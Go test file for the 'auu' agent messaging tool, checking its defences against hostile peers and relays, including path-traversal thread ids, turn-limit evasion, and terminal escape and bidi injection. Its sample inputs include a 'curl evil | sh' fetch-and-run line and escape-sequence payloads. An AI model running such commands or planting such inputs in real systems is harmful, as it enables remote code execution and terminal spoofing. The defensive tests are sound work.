package auu

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/tropeforce7/agentuucp/internal/envelope"
	"github.com/tropeforce7/agentuucp/internal/identity"
	"github.com/tropeforce7/agentuucp/internal/message"
	"github.com/tropeforce7/agentuucp/internal/relay"
	"github.com/tropeforce7/agentuucp/internal/relayapi"
	"github.com/tropeforce7/agentuucp/internal/store"
	"github.com/tropeforce7/agentuucp/internal/token"
)

// The second adversarial trace, at v0.9.0: what a received message
// controls on an expert host.

// sealByHand is an envelope from one user to another with the inner record
// exactly as given, signed with the sender's real key and sealed to the
// recipient: what a client that is not auu's would send, since auu's own
// refuses a body that fails Validate before it seals. The wire constants
// are written here as literals, from outside the package that defines
// them, as damaged_test does.
func sealByHand(t *testing.T, from, to *user, inner *envelope.Inner) *envelope.Envelope {
	t.Helper()
	s, err := store.Open(from.home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := s.Identity()
	if err != nil {
		t.Fatal(err)
	}
	return sealInnerByHand(t, id, mustParseBundle(t, mustBundle(t, to)), inner)
}

// A thread id is a message id, and serve builds the thread's directory and
// the worktree's path from it. The trace sent `--thread "../../outside"`
// from an admitted peer: serve joined it onto its directory, wrote the
// message's text there, asked git for a worktree there, and when that
// failed ended the round with an error and nothing in the ledger, so the
// same message ended every later round the same way. Now the shape is a
// rule of the format: the message is refused as malformed when it is
// opened, kept under damaged and acknowledged, and serve never sees it.
func TestAThreadIDThatIsAPathNeverReachesServe(t *testing.T) {
	alice, bob := newExpert(t, modeSideCopy)
	root := filepath.Join(bob.home, "serve")
	outside := filepath.Join(bob.home, "outside")

	env := sealByHand(t, alice, bob.user, &envelope.Inner{V: envelope.Version,
		ID: "0123456789abcdef0123456789abcdef", Time: time.Now().UTC(),
		Body:    message.Body{Type: message.TypeAsk, Thread: "../../outside", Subject: "hello", Text: "please look"},
		Channel: "jostle",
	})
	s, err := store.Open(alice.home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := s.Identity()
	if err != nil {
		t.Fatal(err)
	}
	r, err := s.DefaultRelay()
	if err != nil {
		t.Fatal(err)
	}
	c, err := dial(s, id, r)
	if err != nil {
		t.Fatal(err)
	}
	relayID, err := c.Post(t.Context(), env, "jostle")
	if err != nil {
		t.Fatalf("post: %v", err)
	}

	var out string
	stderr := captureStderr(t, func() { out, err = bob.tryRun("serve", "--once", "--json") })
	if err != nil {
		t.Fatalf("serve --once ended with an error on a message whose thread id is \"../../outside\": %v\n%s\n%s", err, out, stderr)
	}
	var report roundJSON
	if err := json.Unmarshal([]byte(out), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Answered)+len(report.Failed)+len(report.Skipped) != 0 {
		t.Fatalf("serve saw the message: %+v", report)
	}
	if _, statErr := os.Stat(outside); statErr == nil {
		t.Errorf("a peer's thread id \"../../outside\" made serve write %s, outside %s", outside, root)
	}
	// Refused as malformed when it was opened: kept under damaged, with
	// the word for it, and acknowledged.
	bobStore, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	if rec := damagedRecord(t, bobStore, bob.defaultRelayName(), relayID); rec.Cause != "malformed" {
		t.Errorf("kept as %q, want malformed", rec.Cause)
	}
	if msgs, err := bobStore.List(store.Inbox); err != nil {
		t.Fatal(err)
	} else if len(msgs) != 0 {
		t.Errorf("the message reached the inbox: %+v", msgs[0].Inner.Body)
	}
	// The next round is clean: the message is not met again, and the
	// expert answers what comes after it.
	if report := bob.round(t); len(report.Failed) != 0 || len(report.Answered) != 0 {
		t.Fatalf("the second round was not clean: %+v", report)
	}
	sent := alice.ask(t, "jostle", "after it", "still there?")
	if report := bob.round(t); len(report.Answered) != 1 || report.Answered[0].ID != sent.ID {
		t.Fatalf("the ask behind it was not answered: %+v", report)
	}
}

// auu's own send refuses a thread id of the wrong shape before anything is
// read or sealed, with a usage error naming the shape; so does --reply-to.
func TestSendRefusesAThreadIDThatIsNotAMessageID(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	for _, tc := range []struct{ flag, value string }{
		{"--thread", "../x"},
		{"--thread", "t1"},
		{"--thread", "0123456789ABCDEF0123456789abcdef"},
		{"--reply-to", "../x"},
	} {
		_, err := alice.tryRun("send", "--to", "bob", tc.flag, tc.value, "hello")
		var exit *exitError
		if !errors.As(err, &exit) || exit.code != exitUsage {
			t.Fatalf("%s %s: %v, want a usage error", tc.flag, tc.value, err)
		}
		if !strings.Contains(err.Error(), tc.flag+" "+`"`+tc.value+`"`) ||
			!strings.Contains(err.Error(), "not a message id (32 lowercase hex characters)") {
			t.Fatalf("%s %s: %q does not name the flag and the shape", tc.flag, tc.value, err)
		}
	}
	// And the shape is the whole rule: an id that is not a thread this
	// home knows is still a thread id.
	alice.run("send", "--to", "bob", "--thread", "fedcba9876543210fedcba9876543210", "hello")
}

// TestARecordWhoseThreadIDIsAPathIsRefusedBeforeServeSeesIt: the second
// trace found serve joining a thread id onto a path; handle refuses one
// that is not a message id, and so does worktreeFor. Since the limit
// ledger, a record whose thread is a path is refused a step earlier, at
// store.Load, as a record this program could not have written: serve
// never sees it, the round it would have failed is clean, nothing is
// joined onto a path, and serve ls has nothing to print raw. handle's
// and worktreeFor's own refusals stay as the guards behind Load's, and
// each is reached directly here, since nothing else reaches them now.
func TestARecordWhoseThreadIDIsAPathIsRefusedBeforeServeSeesIt(t *testing.T) {
	alice, bob := newExpert(t, modeSideCopy)
	outside := filepath.Join(bob.home, "outside")
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	crafted := &store.Stored{
		Relay:    bob.defaultRelayName(),
		Received: time.Now().UTC().Add(-time.Minute),
		Inner: &envelope.Inner{
			From: alice.exportFingerprint(), To: bob.exportFingerprint(),
			ID: "0123456789abcdef0123456789abcdef", Time: time.Now().UTC().Add(-time.Minute),
			Body: message.Body{Type: message.TypeAsk, Thread: "../../outside", Subject: "by hand", Text: "written into the spool"},
		},
		SenderName: "alice",
		Channel:    "jostle",
	}
	if err := s.Save(store.Inbox, crafted); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Load(store.Inbox, crafted.Inner.ID); err == nil || !strings.Contains(err.Error(), "thread is not a message id") {
		t.Fatalf("Load took a record whose thread is a path: %v", err)
	}
	sent := alice.ask(t, "jostle", "after it", "please look")

	out, err := bob.tryRun("serve", "--once", "--json")
	if err != nil {
		t.Fatalf("a round with one unreadable record ended %v, want a clean round\n%s", err, out)
	}
	var report roundJSON
	if err := json.Unmarshal([]byte(out), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Failed) != 0 {
		t.Fatalf("failed: %+v, want none: the crafted record is refused before serve sees it", report.Failed)
	}
	if len(report.Answered) != 1 || report.Answered[0].ID != sent.ID {
		t.Fatalf("answered: %+v, want the ask behind it", report.Answered)
	}
	if entry := bob.ledgerOf(t).Messages[crafted.Inner.ID]; entry != nil {
		t.Fatalf("the ledger has %+v for the crafted message, want nothing", entry)
	}
	if _, statErr := os.Stat(outside); statErr == nil {
		t.Errorf("the thread id was joined onto a path: %s exists", outside)
	}
	if ls := bob.run("serve", "ls"); strings.Contains(ls, "outside") {
		t.Errorf("serve ls printed a thread id serve never saw:\n%s", ls)
	}
	// handle's own check, reached directly since Load no longer lets such
	// a record this far: the message built in memory and handed to a run,
	// which fails it with the sentence, writes the failure to the ledger,
	// and joins nothing onto a path.
	cfg, err := loadServeConfig(bob.path)
	if err != nil {
		t.Fatal(err)
	}
	root := filepath.Join(bob.home, "serve")
	led, err := loadLedger(filepath.Join(root, ledgerFile))
	if err != nil {
		t.Fatal(err)
	}
	run := &serveRun{s: s, cfg: cfg, led: led, root: root}
	if err := run.handle(context.Background(), crafted); err != nil {
		t.Fatalf("handle returned %v; want the message failed and nil", err)
	}
	if len(run.out.Failed) != 1 || run.out.Failed[0].ID != crafted.Inner.ID {
		t.Errorf("handle failed %+v, want the crafted message", run.out.Failed)
	}
	if entry := led.Messages[crafted.Inner.ID]; entry == nil || entry.Failures != 1 {
		t.Errorf("the ledger has %+v for the crafted message after handle, want one failure", entry)
	}
	if _, statErr := os.Stat(outside); statErr == nil {
		t.Errorf("handle joined the thread id onto a path: %s exists", outside)
	}
	// And worktreeFor refuses it on its own, the guard behind handle's.
	if _, _, _, err := worktreeFor(root, bob.row, "../../outside",
		t.TempDir(), true); err == nil || !strings.Contains(err.Error(), "not a message id") {
		t.Errorf("worktreeFor took a thread id that is a path: %v", err)
	}
}

// A follow-up is admitted because its in_reply_to names a reply serve sent,
// and the turns are counted by thread. The trace answered each of serve's
// replies under a fresh thread id and was on turn one every time, so
// max_turns was not a limit. Now a reply that names a thread other than
// the one its answer was sent on is nobody's here: it is not answered, the
// original thread's count does not move, and the message stays in the
// inbox like any other that is none of serve's business, said once. The
// follow-up on the right thread past max_turns is still refused, which
// TestServeAnswersAFollowUpUntilTheTurnsRunOut proves.
func TestARenamedFollowUpIsNotAnswered(t *testing.T) {
	alice, bob := newExpert(t, modeReadOnly)
	bob.row.MaxTurns = 1
	bob.write(t)

	sent := alice.ask(t, "jostle", "first", "please look")
	first := bob.round(t)
	if len(first.Answered) != 1 {
		t.Fatalf("the ask was not answered: %+v", first)
	}
	reply := alice.replyOn(t, sent.Thread)

	// A follow-up to serve's reply under a thread id of the sender's own
	// choosing: what a client other than auu's would send, since auu reply
	// copies the thread of the message it answers.
	t.Setenv("AUU_HOME", alice.home)
	s, id, err := loadIdentity()
	if err != nil {
		t.Fatal(err)
	}
	r, err := selectRelay(s, "")
	if err != nil {
		t.Fatal(err)
	}
	recipient, err := s.Resolve("bob")
	if err != nil {
		t.Fatal(err)
	}
	renamed := strings.Repeat("b", 32)
	body := message.Body{
		Type: message.TypeReply, Subject: "again", Thread: renamed,
		InReplyTo: reply.ID, Text: "and again",
	}
	followUp, _, err := sendSealed(s, id, r, recipient, body, nil, sendMode{})
	if err != nil {
		t.Fatal(err)
	}

	var out string
	stderr := captureStderr(t, func() { out, err = bob.tryRun("serve", "--once", "--json") })
	if err != nil {
		t.Fatalf("serve --once: %v\n%s", err, out)
	}
	var second roundJSON
	if err := json.Unmarshal([]byte(out), &second); err != nil {
		t.Fatal(err)
	}
	if n := len(second.Answered); n != 0 {
		t.Errorf("with max_turns 1 and one turn already answered, a follow-up to serve's reply under a new thread id was answered (%d answered this round); "+
			"expected it to be left alone", n)
	}
	if len(second.Failed)+len(second.Skipped) != 0 {
		t.Errorf("the follow-up was counted as work: %+v", second)
	}
	led := bob.ledgerOf(t)
	if n := led.answered(sent.Thread); n != 1 {
		t.Errorf("the original thread has %d turns answered, want 1", n)
	}
	if _, ok := led.Messages[followUp.ID]; ok {
		t.Errorf("the renamed follow-up was written into the ledger: %+v", led.Messages[followUp.ID])
	}
	want := fmt.Sprintf("auu: %s from alice answers reply %s on thread %s but names thread %s; left alone",
		shortID(followUp.ID), shortID(reply.ID), shortID(sent.Thread), shortID(renamed))
	if strings.Count(stderr, want) != 1 {
		t.Errorf("stderr:\n%s\nwant once:\n%s", stderr, want)
	}
	// Still in the inbox, unread, for the owner to see; and a second round
	// leaves it alone again.
	var in inboxJSON
	if err := json.Unmarshal([]byte(bob.run("inbox", "--no-fetch", "--json")), &in); err != nil {
		t.Fatal(err)
	}
	found := false
	for _, m := range in.Messages {
		if m.ID == followUp.ID {
			found = !m.Read
		}
	}
	if !found {
		t.Errorf("the renamed follow-up is not in the inbox unread: %+v", in.Messages)
	}
	if again := bob.round(t); len(again.Answered)+len(again.Failed) != 0 {
		t.Errorf("the second round did something with it: %+v", again)
	}
}

// A relay refuses an attempt at an upload past its window with 410 and
// forgets it, so an interrupted upload whose partial has lapsed cannot be
// resumed as it stands. The sender does not fail on that: --resume asks
// the relay by an attempt from zero, is told the upload is gone, opens a
// new one for the same sealed bytes and sends them all, and the message
// arrives once. The relay's clock is moved by hand between the cut and
// the resume. Before the one-attempt wire this was
// TestResumeReopensAnUploadThatExpiredBetweenPieces, with the relay's
// upload_ttl setting standing where the fixed window now stands.
func TestResumeReopensAnUploadWhoseWindowHasPassed(t *testing.T) {
	var clockMu sync.Mutex
	now := time.Now()
	clock := func() time.Time {
		clockMu.Lock()
		defer clockMu.Unlock()
		return now
	}
	relayURL, gate := startInterruptibleRelayWith(t, 2, 64<<10, func(c *relay.Config) {
		c.Now = clock
	})
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	bob.run("peers", "add", alice.exportLine())
	alice.run("allow", "push")
	bob.run("allow", "push")

	payload := make([]byte, 400<<10)
	for i := range payload {
		payload[i] = byte(i*13 + 5)
	}
	file := filepath.Join(t.TempDir(), "lapsed.bin")
	if err := os.WriteFile(file, payload, 0o600); err != nil {
		t.Fatal(err)
	}
	if out, err := alice.tryRun("send", "--to", "bob", "--subject", "the lapsed one",
		"--attach", file, "here it is"); err == nil {
		t.Fatalf("the send should have failed with the relay cut off part way:\n%s", out)
	}
	if passed, cut := gate.counts(); passed != 0 || cut == 0 {
		t.Fatalf("the gate answered %d attempts and cut %d; the test proves nothing", passed, cut)
	}
	before := onlyPending(t, alice)
	if _, err := os.Stat(filepath.Join(alice.home, "outbox", before.MessageID+".stream")); err != nil {
		t.Fatal(err)
	}

	// The window passes while the sender is away.
	clockMu.Lock()
	now = now.Add(relayapi.ResumeWindow + time.Minute)
	clockMu.Unlock()
	gate.open()
	out := alice.run("send", "--resume")
	if strings.Contains(out, "nothing to resume") {
		t.Fatalf("--resume found nothing:\n%s", out)
	}
	// Reopened: the ask was answered 410, and the whole stream went again
	// under a new upload id from zero, from the same sealed bytes; the
	// outbox is clear.
	seen := gate.seen()
	if len(seen) != 2 || seen[0].offset != 0 || seen[0].status != http.StatusGone ||
		seen[1].offset != 0 || seen[1].status != http.StatusCreated {
		t.Errorf("--resume's attempts after the lapse: %+v; want the ask answered 410 and the whole stream from zero answered 201", seen)
	}
	if entries, err := os.ReadDir(filepath.Join(alice.home, "outbox")); err == nil && len(entries) != 0 {
		t.Errorf("the outbox was not cleared after the reopened resume: %d entries", len(entries))
	}

	var got inboxJSON
	if err := json.Unmarshal([]byte(bob.run("inbox", "--json")), &got); err != nil {
		t.Fatal(err)
	}
	var found int
	var id string
	for _, m := range got.Messages {
		if m.Subject == "the lapsed one" {
			found++
			id = m.ID
		}
	}
	if found != 1 {
		t.Fatalf("the resumed message arrived %d times, want once: %+v", found, got.Messages)
	}
	dir := t.TempDir()
	bob.run("extract", id, "--out", dir)
	if back, err := os.ReadFile(filepath.Join(dir, "lapsed.bin")); err != nil || !bytes.Equal(back, payload) {
		t.Fatalf("the payload after the reopened upload differs (%v): %d bytes back, %d sent", err, len(back), len(payload))
	}
}

// A relay's answer is checked for shape before a command slices it: auu
// cert ls prints each serial's first sixteen characters, and a relay that
// answered a two-byte serial crashed it. The client refuses the listing,
// and the command prints the malformed-answer sentence, naming the field
// and the relay, and exits 2; a panic would fail the test on its own.
func TestCertLsRefusesAShortSerialRatherThanSlicingIt(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasSuffix(r.URL.Path, "/certs") {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: "ab", Label: "laptop"}}})
	}))
	defer srv.Close()
	home := t.TempDir()
	s, err := store.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := identity.Generate("alice")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.SaveIdentity(id); err != nil {
		t.Fatal(err)
	}
	if err := s.SaveConfig(store.Config{Name: "alice"}); err != nil {
		t.Fatal(err)
	}
	if _, err := s.AddRelay("", srv.URL); err != nil {
		t.Fatal(err)
	}
	alice := &user{t: t, home: home}
	out, err := alice.tryRun("cert", "ls")
	var exit *exitError
	if !errors.As(err, &exit) || exit.code != exitTransport {
		t.Fatalf("cert ls against a relay answering a two-byte serial: %v, want exit %d\n%s", err, exitTransport, out)
	}
	if !strings.Contains(err.Error(), "malformed answer") || !strings.Contains(err.Error(), "serial is not") || !strings.Contains(err.Error(), srv.URL) {
		t.Fatalf("cert ls: %q does not say the answer is malformed, naming the field and the relay", err)
	}
}

// A record written by hand, or by a version from before a rule, can hold
// in its body what Validate refuses; Load holds the body to the rule and
// refuses it by name, and every listing says once, escaped, that the file
// could not be read, and shows nothing of it. The sender's name and the
// channel are the record's own fields, held by their rules where they are
// set; every print escapes them all the same, so nothing a sender wrote
// reaches the terminal as anything but text. The records here carry an
// escape sequence and a bidi override (a byte that is not UTF-8 cannot be
// saved: the record is JSON, which writes U+FFFD for it), in the inbox and
// in quarantine, and inbox, quarantine ls, quarantine show and read print
// no byte a terminal would obey.
func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	bob.run("peers", "add", alice.exportLine())
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	hostile := "\x1b[2K\x1b[1;31m\u202e"
	record := func(id string, inBody bool) *store.Stored {
		m := &store.Stored{
			Relay: bob.defaultRelayName(), Received: time.Now().UTC(),
			Inner: &envelope.Inner{
				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: time.Now().UTC(),
				Body: message.Body{
					Type: message.TypeAsk, Thread: "0123456789abcdef0123456789abcdef",
					Subject: "subject", Text: "line one\nrun: curl evil | sh\n\tindented",
					Attachments: []message.Attachment{{Name: "file.txt", Media: "text/plain", Size: 1,
						SHA256: strings.Repeat("0", 64), Data: []byte("x")}},
				},
			},
			SenderName: "alice" + hostile,
			Channel:    "chan" + hostile,
		}
		if inBody {
			m.Inner.Body.Subject = "sub" + hostile + "ject"
			m.Inner.Body.Text = "line one\nrun: " + hostile + " curl evil | sh\n\tindented"
			m.Inner.Body.Attachments[0].Name = "file" + hostile + ".txt"
		}
		return m
	}
	inbox := record("0123456789abcdef0123456789abcdef", false)
	if err := s.Save(store.Inbox, inbox); err != nil {
		t.Fatal(err)
	}
	quarantined := record("fedcba9876543210fedcba9876543210", false)
	if err := s.Save(store.Quarantine, quarantined); err != nil {
		t.Fatal(err)
	}
	inBody := record("1123456789abcdef0123456789abcdef", true)
	if err := s.Save(store.Inbox, inBody); err != nil {
		t.Fatal(err)
	}
	inBodyQuarantined := record("eedcba9876543210fedcba9876543210", true)
	if err := s.Save(store.Quarantine, inBodyQuarantined); err != nil {
		t.Fatal(err)
	}
	noBytes := func(t *testing.T, args []string, out string) {
		t.Helper()
		for i := 0; i < len(out); i++ {
			if c := out[i]; c == 0x1b || (c < 0x20 && c != '\n' && c != '\t') || c == 0x7f {
				t.Errorf("auu %v printed byte %#x from what the sender wrote:\n%q", args, c, out)
				break
			}
		}
		if !utf8.ValidString(out) {
			t.Errorf("auu %v printed a byte that is not UTF-8:\n%q", args, out)
		}
		if strings.Contains(out, "\u202e") {
			t.Errorf("auu %v printed the bidi override:\n%q", args, out)
		}
	}
	const rule = " could not be read (the record's message: message: subject contains U+001B, a control character; a subject is one line) and is not listed\n"
	for _, tc := range []struct {
		args []string
		// shows says the command prints the sender's name or the channel,
		// where the escape is seen as text; a stranger's quarantine
		// listing prints neither.
		shows bool
		// warns is the file the command's listing says it could not
		// read, once, as the warning is said once per file per process.
		warns string
	}{
		{[]string{"inbox", "--no-fetch"}, true, filepath.Join(bob.home, "inbox", inBody.Inner.ID+".json")},
		{[]string{"read", inbox.Inner.ID}, true, ""},
		{[]string{"quarantine", "ls"}, false, filepath.Join(bob.home, "quarantine", inBodyQuarantined.Inner.ID+".json")},
		{[]string{"quarantine", "show", quarantined.Inner.ID}, false, ""},
	} {
		var out string
		var err error
		stderr := captureStderr(t, func() { out, err = bob.tryRun(tc.args...) })
		if err != nil {
			t.Fatalf("auu %v: %v\n%s", tc.args, err, out)
		}
		noBytes(t, tc.args, out)
		noBytes(t, tc.args, stderr)
		if tc.shows && !strings.Contains(out, `\x1b[2K`) {
			t.Errorf("auu %v does not show the escape as text:\n%s", tc.args, out)
		}
		// The record whose body fails the rule is not shown, and the
		// listing says once, by its file and the rule it failed, that it
		// is not.
		if strings.Contains(out, "sub\\x1b") || strings.Contains(out, "run: \\x1b") || strings.Contains(out, "file\\x1b") ||
			strings.Contains(out, inBody.Inner.ID[:12]) || strings.Contains(out, inBodyQuarantined.Inner.ID[:12]) {
			t.Errorf("auu %v showed a record whose body fails the rule:\n%s", tc.args, out)
		}
		if tc.warns != "" && strings.Count(stderr, "warning: "+tc.warns+rule) != 1 {
			t.Errorf("auu %v said on standard error:\n%q\nwant once:\n%q", tc.args, stderr, "warning: "+tc.warns+rule)
		}
	}
	// The text keeps its lines and its tab, and read shows the sender and
	// the channel escaped where they are.
	out := bob.run("read", inbox.Inner.ID)
	if !strings.Contains(out, "line one\nrun: curl evil | sh\n\tindented") {
		t.Errorf("read did not keep the text's lines and tab:\n%q", out)
	}
	if !strings.Contains(out, `from:    alice\x1b[2K`) || !strings.Contains(out, `channel: chan\x1b[2K`) {
		t.Errorf("read did not escape the sender or the channel:\n%s", out)
	}
	// A record whose body fails the rule is not a message: read finds
	// nothing.
	if out, err := bob.tryRun("read", inBody.Inner.ID); err == nil || !strings.Contains(err.Error(), "no message matches") {
		t.Errorf("read of a record whose body fails the rule: %v\n%s", err, out)
	}
}

// truncate cuts on a rune boundary: a subject of wide characters cut by
// bytes left a broken final rune on the terminal.
func TestTruncateCutsOnARuneBoundary(t *testing.T) {
	for _, tc := range []struct {
		in   string
		n    int
		want string
	}{
		{"short", 10, "short"},
		{"exactly ten", 11, "exactly ten"},
		{"a long ascii subject", 8, "a long …"},
		{"中文中文中文", 4, "中文中…"},
		{"café au lait", 5, "café…"},
	} {
		got := truncate(tc.in, tc.n)
		if got != tc.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tc.in, tc.n, got, tc.want)
		}
		if !utf8.ValidString(got) {
			t.Errorf("truncate(%q, %d) = %q is not UTF-8", tc.in, tc.n, got)
		}
	}
}

// A file or an editor on Windows writes CRLF, and a carriage return is a
// control character the text rule refuses; a refusal naming U+000D at
// every send there would be the wrong sentence for an honest file. The
// sender's command folds CRLF to a line break in the one place every
// source of text passes before Validate, and what goes on the wire has no
// carriage return in it; a carriage return on its own is still refused,
// since the wire rule is unchanged.
func TestABodyFileWithWindowsLineEndingsSends(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	bob.run("peers", "add", alice.exportLine())
	alice.run("allow", "push")
	bob.run("allow", "push")

	dir := t.TempDir()
	crlf := filepath.Join(dir, "windows.txt")
	if err := os.WriteFile(crlf, []byte("first line\r\nsecond line\r\n\r\n\tindented\r\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	var sent sentJSON
	if err := json.Unmarshal([]byte(alice.run("send", "--to", "bob", "--subject", "from windows", "--body-file", crlf, "--json")), &sent); err != nil {
		t.Fatal(err)
	}
	bob.run("inbox")
	var got messageJSON
	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got.Text, "\r") {
		t.Errorf("a carriage return reached the wire: %q", got.Text)
	}
	if want := "first line\nsecond line\n\n\tindented\n"; got.Text != want {
		t.Errorf("the text arrived as %q, want %q", got.Text, want)
	}
	// Standard input the same.
	out, err := alice.withStdin("piped\r\nline\r\n", "send", "--to", "bob", "--subject", "from a pipe", "--json", "-")
	if err != nil {
		t.Fatalf("send from stdin: %v\n%s", err, out)
	}
	if err := json.Unmarshal([]byte(out), &sent); err != nil {
		t.Fatal(err)
	}
	bob.run("inbox")
	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
		t.Fatal(err)
	}
	if got.Text != "piped\nline\n" {
		t.Errorf("the piped text arrived as %q", got.Text)
	}
	// A carriage return on its own is not a line ending, and the rule
	// refuses it by name.
	lone := filepath.Join(dir, "lone.txt")
	if err := os.WriteFile(lone, []byte("one\rtwo"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err = alice.tryRun("send", "--to", "bob", "--subject", "a lone return", "--body-file", lone)
	var exit *exitError
	if !errors.As(err, &exit) || exit.code != exitUsage || !strings.Contains(err.Error(), "text contains U+000D, a control character") {
		t.Errorf("a lone carriage return: %v, want the usage refusal naming U+000D", err)
	}
}

// auu reply THREAD answers the latest message on the thread, and latest
// is by arrival here, not by the stamp a sender chose: a record stamped a
// year ahead that arrived first is not the one answered. The records are
// saved by hand, since open now refuses a stamp from the future; a record
// from before that rule, or written by hand, is what this is for. And
// read shows the stamp as the sender's, beside when it arrived.
func TestReplyByThreadAnswersTheLatestArrivalNotTheLatestStamp(t *testing.T) {
	alice, bob := twoPeers(t)
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC().Truncate(time.Second)
	const thread = "0123456789abcdef0123456789abcdef"
	record := func(id string, received, stamped time.Time, relayID int64, text string) *store.Stored {
		return &store.Stored{
			Relay: bob.defaultRelayName(), RelayID: relayID, Received: received,
			Inner: &envelope.Inner{
				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: stamped,
				Body: message.Body{Type: message.TypeAsk, Thread: thread, Subject: "the thread", Text: text},
			},
			SenderName: "alice",
		}
	}
	fromTheFuture := record("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", now.Add(-time.Hour), now.AddDate(1, 0, 0), 1, "stamped next year")
	honest := record("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", now, now, 2, "stamped today")
	for _, m := range []*store.Stored{fromTheFuture, honest} {
		if err := s.Save(store.Inbox, m); err != nil {
			t.Fatal(err)
		}
	}
	var sent sentJSON
	if err := json.Unmarshal([]byte(bob.run("reply", thread[:12], "--json", "answering the thread")), &sent); err != nil {
		t.Fatal(err)
	}
	reply, err := s.Load(store.Sent, sent.ID)
	if err != nil {
		t.Fatal(err)
	}
	if reply.Inner.Body.InReplyTo != honest.Inner.ID {
		t.Errorf("reply THREAD answered %s; want the one that arrived last, %s", reply.Inner.Body.InReplyTo, honest.Inner.ID)
	}
	out := bob.run("read", fromTheFuture.Inner.ID)
	if !strings.Contains(out, "sent:    "+fromTheFuture.Inner.Time.Local().Format(time.RFC1123)+" (the sender's clock)") ||
		!strings.Contains(out, "received: "+fromTheFuture.Received.Local().Format(time.RFC1123)) {
		t.Errorf("read does not show the stamp as the sender's beside the arrival:\n%s", out)
	}
}

// The integer review at af0d96e: a peer's or a relay's number rendered
// for a person. A quarantined stream is saved from its manifest alone,
// before any payload is fetched or its size checked against the relay's
// listing, so an attachment declared at a pebibyte costs the sender a
// kilobyte and once panicked inbox show and extract at "KMGT"[4]. The
// listing a relay sends for watch carries a size the same way.
func TestAPebibyteDeclaredByAPeerPrints(t *testing.T) {
	s, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	m := &store.Stored{
		Relay: "relay", RelayID: 7, Received: time.Now(), Streamed: true, PayloadOnRelay: true,
		Inner: &envelope.Inner{
			From: strings.Repeat("a", 64), To: strings.Repeat("b", 64),
			ID: strings.Repeat("c", 32), Time: time.Now(),
			Body: message.Body{
				Type: "note", Thread: strings.Repeat("d", 32),
				Attachments: []message.Attachment{{
					Name: "big.bin", Media: "application/octet-stream",
					Size: 1 << 50, SHA256: strings.Repeat("e", 64),
				}},
			},
		},
	}
	out, _ := captureStdout(t, func() error { printMessage(s, store.Quarantine, m); return nil })
	if !strings.Contains(out, "1.0 PiB") {
		t.Errorf("a quarantined stream whose manifest declares a 2^50 byte attachment printed:\n%s", out)
	}
	// And the relay's listing through watch's summary.
	out, _ = captureStdout(t, func() error {
		printEvents(nil, []any{&messageEvent{Type: eventMessage, Relay: "relay", Channel: "default", Kind: "stream", Size: 1 << 50, ID: 7}}, nil)
		return nil
	})
	if !strings.Contains(out, "1.0 PiB") {
		t.Errorf("a relay listing a 2^50 byte message printed:\n%s", out)
	}
}

// A token pasted to auu enrol or auu token show is parsed and was
// described before anything checked its claims, and the description
// sliced the issuer: a two-character issuer panicked. Now the claims are
// validated first and the command says the token is malformed, naming the
// field, and describes nothing; describeToken itself never slices.
func TestAPastedTokenWithAShortIssuerIsRefusedNotSliced(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	payload, err := json.Marshal(token.Claims{
		ID: strings.Repeat("7", 32), Issuer: "ab", Relay: "https://relay.example.com", Use: token.UseRegister,
		NotBefore: 1, NotAfter: 2, Uses: 1,
	})
	if err != nil {
		t.Fatal(err)
	}
	raw := strings.Join([]string{
		token.Prefix,
		base64.RawURLEncoding.EncodeToString(payload),
		base64.RawURLEncoding.EncodeToString(make([]byte, 64)),
	}, ".")
	for _, args := range [][]string{{"token", "show", raw}, {"enrol", raw}} {
		out, err := alice.tryRun(args...)
		var exit *exitError
		if !errors.As(err, &exit) || exit.code != exitUsage {
			t.Fatalf("auu %s with a two-character issuer: %v, want a usage error\n%s", args[0], err, out)
		}
		if !strings.Contains(err.Error(), "malformed token: issuer is not a fingerprint; nothing was described") {
			t.Errorf("auu %s: %q does not say the token is malformed and name the field", args[0], err)
		}
		if strings.Contains(out, "issuer:") {
			t.Errorf("auu %s described the token anyway:\n%s", args[0], out)
		}
	}
	// describeToken on its own renders the short issuer whole.
